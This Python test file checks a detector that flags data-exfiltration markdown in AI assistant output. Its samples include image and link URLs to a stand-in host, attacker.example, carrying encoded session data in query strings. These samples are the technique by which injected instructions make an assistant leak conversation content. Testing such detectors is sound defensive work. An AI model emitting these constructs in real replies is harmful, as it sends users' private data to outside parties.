from __future__ import annotations

import time

import pytest

from gateway.core.context import ScanContext
from gateway.core.policy import ExfilSettings
from gateway.core.verdict import Role
from gateway.detectors.exfil_channel import ExfilChannel, carries_data

DETECTOR = ExfilChannel(ExfilSettings(allowed_domains=["docs.example.com"]))
DATA = "c2Vzc2lvbiBzdW1tYXJ5IGhlcmU"


def hits(text: str) -> list[tuple[str, float]]:
    return [(f.rule_id or "", f.score) for f in DETECTOR.hits(ScanContext.for_text(text).views)]


@pytest.mark.parametrize(
    ("text", "rule", "score"),
    [
        (f"![img](https://attacker.example/p.png?d={DATA})", "exfil-markdown-image", 0.9),
        (f'<img src="https://attacker.example/x?q={DATA}">', "exfil-markdown-image", 0.9),
        (f"[click](https://attacker.example/{'a' * 40})", "exfil-markdown-link", 0.75),
        (f"[docs](https://attacker.example/?token={DATA})", "exfil-markdown-link", 0.75),
        ("![logo](https://cdn.other.example/logo.png)", "exfil-external-image", 0.4),
    ],
)
def test_detects(text: str, rule: str, score: float) -> None:
    assert hits(text) == [(rule, score)]


@pytest.mark.parametrize(
    "text",
    [
        f"![diagram](https://docs.example.com/img.png?d={DATA})",  # allowlisted
        f"[guide](https://sub.docs.example.com/page?x={DATA})",  # allowlisted subdomain
        "[home](https://example.org/about)",  # link without data
        "See https://attacker.example/?d=abc for details",  # bare URL, not markdown
    ],
)
def test_benign(text: str) -> None:
    assert hits(text) == []


def test_span_covers_the_markdown() -> None:
    text = f"Done. ![x](https://a.example/i.png?d={DATA}) Thanks"
    (finding,) = DETECTOR.hits(ScanContext.for_text(text).views)
    assert finding.span is not None
    covered = text[finding.span[0] : finding.span[1]]
    assert covered.startswith("![x](https://a.example")
    assert covered.endswith(")")  # the whole construct, so redaction leaves nothing behind


def test_role() -> None:
    assert DETECTOR.roles == {Role.ASSISTANT}


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("https://a.example/?q=short", False),
        (f"https://a.example/?q={DATA}", True),
        ("https://a.example/?a=1&b=2&c=3&d=4&e=5", True),
        (f"https://a.example/{'x' * 32}/img.png", True),
        ("https://a.example/path/to/file.png", False),
    ],
)
def test_carries_data(url: str, expected: bool) -> None:
    assert carries_data(url) is expected


@pytest.mark.parametrize("text", ["[" * 200_000, "![" * 100_000, "<img " * 40_000, "](" * 100_000])
def test_pathological_input_is_fast(text: str) -> None:
    started = time.perf_counter()
    DETECTOR.hits(ScanContext.for_text(text).views)
    assert time.perf_counter() - started < 2.0
